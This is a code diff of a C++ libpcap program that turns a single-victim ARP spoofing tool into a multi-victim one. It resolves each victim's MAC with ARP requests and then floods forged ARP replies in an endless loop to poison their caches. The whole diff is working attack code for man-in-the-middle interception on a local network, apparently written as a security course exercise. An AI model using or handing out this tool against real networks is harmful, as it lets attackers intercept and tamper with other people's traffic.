@@ -11,6 +11,8 @@
 #include <sys/ioctl.h>
 #include <net/if.h>
 
+
+
 #pragma pack(push, 1)
 struct EthArpPacket final {
 	EthHdr eth_;
@@ -50,6 +52,7 @@ void getMacAddress(const char* ifaceName, char* macAddressStr) {
     
 }
 
+
 void getIPAddress(const char* ifaceName, char* ipAddressStr) {
     int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     if (sockfd == -1) {
@@ -81,11 +84,12 @@ void getIPAddress(const char* ifaceName, char* ipAddressStr) {
     
 }
 
+
 int main(int argc, char* argv[]) {
 	//printf("start main");
-	if (argc != 4) {
+	if (argc < 3) {
 		usage();
-		return -1;
+		return 1;
 	}
 
 	char* dev = argv[1];
@@ -98,85 +102,105 @@ int main(int argc, char* argv[]) {
 	}
 	
 	const char* ifname = dev;
-	char macaddr[18];
-	char ipaddr[20];
 	
-	//printf("before get()");
-	getMacAddress(ifname, macaddr);
+	char my_mac_addr[18];
+	char my_ip_addr[20];
 	
-	getIPAddress(ifname, ipaddr);
+	getMacAddress(ifname, my_mac_addr);
 	
-	printf("%s\n", macaddr);
-	printf("%s\n", ipaddr);
+	getIPAddress(ifname, my_ip_addr);
 	
-	
-	// send arp request to victim
-	
+	printf("%s\n", my_mac_addr);
+	printf("%s\n", my_ip_addr);
+
 	EthArpPacket reqpacket;
 
-	reqpacket.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
-	reqpacket.eth_.smac_ = Mac(macaddr);
-	reqpacket.eth_.type_ = htons(EthHdr::Arp);
-
-	reqpacket.arp_.hrd_ = htons(ArpHdr::ETHER);
-	reqpacket.arp_.pro_ = htons(EthHdr::Ip4);
-	reqpacket.arp_.hln_ = Mac::SIZE;
-	reqpacket.arp_.pln_ = Ip::SIZE;
-	reqpacket.arp_.op_ = htons(ArpHdr::Request);
-	reqpacket.arp_.smac_ = Mac(macaddr); // source mac (self)
-	reqpacket.arp_.sip_ = htonl(Ip(ipaddr)); // source ip (self)
-	reqpacket.arp_.tmac_ = Mac("00:00:00:00:00:00"); // target mac (00:)
-	reqpacket.arp_.tip_ = htonl(Ip(argv[2])); // victim ip
-
-	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&reqpacket), sizeof(EthArpPacket));
-	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-	}
-	
-	
-	// ARP response packet from victim
 	struct pcap_pkthdr* header;
 	const u_char* packet;
-	EthArpPacket* respacket;
-	int timeout_ms = 1000; // 타임아웃을 1000ms로 설정
-	int ret = pcap_next_ex(handle, &header, &packet);
-	printf("%d\n", ret);
-	if (ret == 1) { // 패킷을 정상적으로 수신한 경우
-		respacket = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet));
-		// 수신한 ARP 응답 패킷에서 필요한 정보를 추출하여 사용
-	} else { // 타임아웃이 발생한 경우
-		puts("Timeout occurred.");
-	}
-	
-	//printf("victim res eth dmac: %s\n", respacket->eth_.dmac_.ToString().c_str());
-	// printf("victim res eth smac: %s\n", respacket->eth_.smac_.ToString().c_str());
-	
-	// arp spoof to victim
-	 while(1) {
-		EthArpPacket atkpacket;
 
-		atkpacket.eth_.dmac_ = respacket->eth_.smac_;
-		atkpacket.eth_.smac_ = Mac(macaddr);
-		atkpacket.eth_.type_ = htons(EthHdr::Arp);
+	int sender_num = ((argc - 2) / 2);
+	EthArpPacket** respacket = new EthArpPacket*[sender_num];
 
-		atkpacket.arp_.hrd_ = htons(ArpHdr::ETHER);
-		atkpacket.arp_.pro_ = htons(EthHdr::Ip4);
-		atkpacket.arp_.hln_ = Mac::SIZE;
-		atkpacket.arp_.pln_ = Ip::SIZE;
-		atkpacket.arp_.op_ = htons(ArpHdr::Reply);
-		atkpacket.arp_.smac_ = Mac(macaddr); // source mac (self)
-		atkpacket.arp_.sip_ = htonl(Ip(argv[3])); // source ip (target IP)
-		atkpacket.arp_.tmac_ = respacket->eth_.smac_;
-		atkpacket.arp_.tip_ = htonl(Ip(argv[2])); // victim ip
+	// send and receive arp request to sender
+	for (int i = 2, j = 0; i < argc; i += 2, j++) {
 
-		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&atkpacket), sizeof(EthArpPacket));
+		// send arp request to sender
+		
+		// ethernet frame
+		// dst mac: broadcast
+		reqpacket.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
+
+		// src mac: my mac
+		reqpacket.eth_.smac_ = Mac(my_mac_addr);
+
+		// type: arp
+		reqpacket.eth_.type_ = htons(EthHdr::Arp);
+
+		// arp datagram
+		reqpacket.arp_.hrd_ = htons(ArpHdr::ETHER);
+		reqpacket.arp_.pro_ = htons(EthHdr::Ip4);
+		reqpacket.arp_.hln_ = Mac::SIZE;
+		reqpacket.arp_.pln_ = Ip::SIZE;
+		reqpacket.arp_.op_ = htons(ArpHdr::Request);
+		reqpacket.arp_.smac_ = Mac(my_mac_addr); // source mac (self)
+		reqpacket.arp_.sip_ = htonl(Ip(my_ip_addr)); // source ip (self)
+		reqpacket.arp_.tmac_ = Mac("00:00:00:00:00:00"); // target mac (00:)
+		reqpacket.arp_.tip_ = htonl(Ip(argv[i])); // victim ip
+
+		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&reqpacket), sizeof(EthArpPacket));
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 		}
+
+		// receive ARP response from sender
 		
+		int timeout_ms = 1000; // 타임아웃 1000ms
+		int ret = pcap_next_ex(handle, &header, &packet);
+		printf("%d\n", ret);
+		if (ret == 1) { // 패킷 정상 수신
+			respacket[j] = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet));
+		}
+		else { // 타임아웃이 발생한 경우
+			puts("Timeout occurred.");
+		}
+
 	}
 	
 
+	EthArpPacket atkpacket;
+
+	// arp spoof sender
+	while(1) {
+
+		for (int i = 2, j = 0; i < argc; i += 2, j++) {
+			// dst mac: sender mac
+			atkpacket.eth_.dmac_ = respacket[j]->eth_.smac_;
+			// src mac: my mac
+			atkpacket.eth_.smac_ = Mac(my_mac_addr);
+			atkpacket.eth_.type_ = htons(EthHdr::Arp);
+
+			atkpacket.arp_.hrd_ = htons(ArpHdr::ETHER);
+			atkpacket.arp_.pro_ = htons(EthHdr::Ip4);
+			atkpacket.arp_.hln_ = Mac::SIZE;
+			atkpacket.arp_.pln_ = Ip::SIZE;
+			atkpacket.arp_.op_ = htons(ArpHdr::Reply);
+			// src mac: my mac
+			atkpacket.arp_.smac_ = Mac(my_mac_addr);
+			// src ip: target ip
+			atkpacket.arp_.sip_ = htonl(Ip(argv[i + 1]));
+			// target mac: sender mac
+			atkpacket.arp_.tmac_ = respacket[j]->eth_.smac_;
+			// target ip: sender ip
+			atkpacket.arp_.tip_ = htonl(Ip(argv[i]));
+
+			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&atkpacket), sizeof(EthArpPacket));
+			if (res != 0) {
+				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+			}
+		}
+	}
+	
+	delete[] respacket;
 	pcap_close(handle);
 }
 
